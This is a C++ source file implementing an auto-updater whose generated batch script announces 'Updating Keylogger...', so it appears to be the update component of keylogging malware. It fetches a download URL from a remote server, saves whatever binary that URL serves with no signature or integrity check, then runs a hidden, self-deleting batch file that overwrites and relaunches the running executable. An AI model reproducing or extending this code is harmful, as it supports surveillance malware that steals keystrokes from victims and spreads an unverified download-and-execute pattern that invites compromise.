#include "AutoUpdater.h"
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <windows.h>
#include <fstream>
#include <iostream>
#include <filesystem>

using json = nlohmann::json;
namespace fs = std::filesystem;

// 回调函数，用于写入下载的文件
size_t WriteFileCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    std::ofstream* file = static_cast<std::ofstream*>(userp);
    if (!file) return 0;
    
    size_t written = file->write(static_cast<char*>(contents), size * nmemb).tellp();
    return written;
}

// 回调函数，用于读取响应
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append(static_cast<char*>(contents), newLength);
    } catch (std::bad_alloc&) {
        return 0;
    }
    return newLength;
}

AutoUpdater::AutoUpdater(const std::string& api_base, const std::string& current_version) 
    : api_base_url_(api_base), current_version_(current_version) {
    // 初始化curl
    curl_global_init(CURL_GLOBAL_DEFAULT);
}

AutoUpdater::~AutoUpdater() {
    // 清理curl
    curl_global_cleanup();
}

bool AutoUpdater::checkForUpdates(std::string& latest_version, std::string& download_url) {
    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "Failed to initialize curl" << std::endl;
        return false;
    }

    std::string response_string;
    std::string url = api_base_url_ + "/api/update/check";
    
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        std::cerr << "Check update request failed: " << curl_easy_strerror(res) << std::endl;
        return false;
    }

    try {
        json j = json::parse(response_string);
        if (j["code"] == 200 && j["data"].contains("version") && j["data"].contains("download_url")) {
            latest_version = j["data"]["version"];
            download_url = j["data"]["download_url"];
            
            // 比较版本号
            // 简单的版本号比较，假设版本号格式为 x.y.z
            int current_major = 0, current_minor = 0, current_patch = 0;
            int latest_major = 0, latest_minor = 0, latest_patch = 0;
            
            sscanf(current_version_.c_str(), "%d.%d.%d", &current_major, &current_minor, &current_patch);
            sscanf(latest_version.c_str(), "%d.%d.%d", &latest_major, &latest_minor, &latest_patch);
            
            if (latest_major > current_major || 
                (latest_major == current_major && latest_minor > current_minor) || 
                (latest_major == current_major && latest_minor == current_minor && latest_patch > current_patch)) {
                return true; // 有更新
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Failed to parse update response: " << e.what() << std::endl;
    }

    return false;
}

bool AutoUpdater::downloadUpdate(const std::string& download_url, const std::string& save_path) {
    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "Failed to initialize curl" << std::endl;
        return false;
    }

    // 确保保存目录存在
    fs::path save_dir = fs::path(save_path).parent_path();
    if (!fs::exists(save_dir)) {
        fs::create_directories(save_dir);
    }

    std::ofstream outfile(save_path, std::ios::binary);
    if (!outfile) {
        std::cerr << "Failed to open file for writing: " << save_path << std::endl;
        curl_easy_cleanup(curl);
        return false;
    }

    curl_easy_setopt(curl, CURLOPT_URL, download_url.c_str());
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteFileCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &outfile);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    outfile.close();

    if (res != CURLE_OK) {
        std::cerr << "Download failed: " << curl_easy_strerror(res) << std::endl;
        // 删除不完整的文件
        if (fs::exists(save_path)) {
            fs::remove(save_path);
        }
        return false;
    }

    // 检查文件是否成功下载
    if (!fs::exists(save_path) || fs::file_size(save_path) == 0) {
        std::cerr << "Downloaded file is empty or not found" << std::endl;
        return false;
    }

    return true;
}

bool AutoUpdater::installUpdate(const std::string& update_file_path) {
    // 检查更新文件是否存在
    if (!fs::exists(update_file_path)) {
        std::cerr << "Update file not found: " << update_file_path << std::endl;
        return false;
    }

    // 获取当前可执行文件路径
    wchar_t exe_path[MAX_PATH];
    DWORD len = GetModuleFileNameW(NULL, exe_path, MAX_PATH);
    if (len == 0) {
        std::cerr << "Failed to get executable path" << std::endl;
        return false;
    }

    std::wstring exe_path_w(exe_path);
    std::wstring update_path_w = std::wstring(update_file_path.begin(), update_file_path.end());

    // 创建一个批处理文件来执行更新
    std::wstring batch_file = exe_path_w;
    size_t dot_pos = batch_file.find_last_of(L'.');
    if (dot_pos != std::wstring::npos) {
        batch_file = batch_file.substr(0, dot_pos) + L"_update.bat";
    } else {
        batch_file += L"_update.bat";
    }

    std::ofstream batch_out(std::string(batch_file.begin(), batch_file.end()));
    if (!batch_out) {
        std::cerr << "Failed to create batch file" << std::endl;
        return false;
    }

    // 写入批处理文件内容
    std::string exe_path_str(exe_path_w.begin(), exe_path_w.end());
    std::string update_path_str(update_file_path);
    
    batch_out << "@echo off" << std::endl;
    batch_out << "echo Updating Keylogger..." << std::endl;
    batch_out << "timeout /t 2 /nobreak >nul" << std::endl;
    batch_out << "copy /y \"" << update_path_str << "\" \"" << exe_path_str << "\"" << std::endl;
    batch_out << "if %errorlevel% equ 0 (" << std::endl;
    batch_out << "    echo Update successful!" << std::endl;
    batch_out << "    start \"\" \"" << exe_path_str << "\"" << std::endl;
    batch_out << ") else (" << std::endl;
    batch_out << "    echo Update failed!" << std::endl;
    batch_out << "    pause" << std::endl;
    batch_out << ")" << std::endl;
    batch_out << "del \"%~f0\"" << std::endl;
    batch_out.close();

    // 执行批处理文件
    SHELLEXECUTEINFOW sei = { 0 };
    sei.cbSize = sizeof(SHELLEXECUTEINFOW);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpFile = batch_file.c_str();
    sei.nShow = SW_HIDE;

    if (!ShellExecuteExW(&sei)) {
        std::cerr << "Failed to execute update batch file" << std::endl;
        return false;
    }

    // 等待批处理文件启动
    Sleep(1000);

    // 关闭当前进程
    exit(0);

    return true; // 实际上不会执行到这里，因为上面已经exit了
}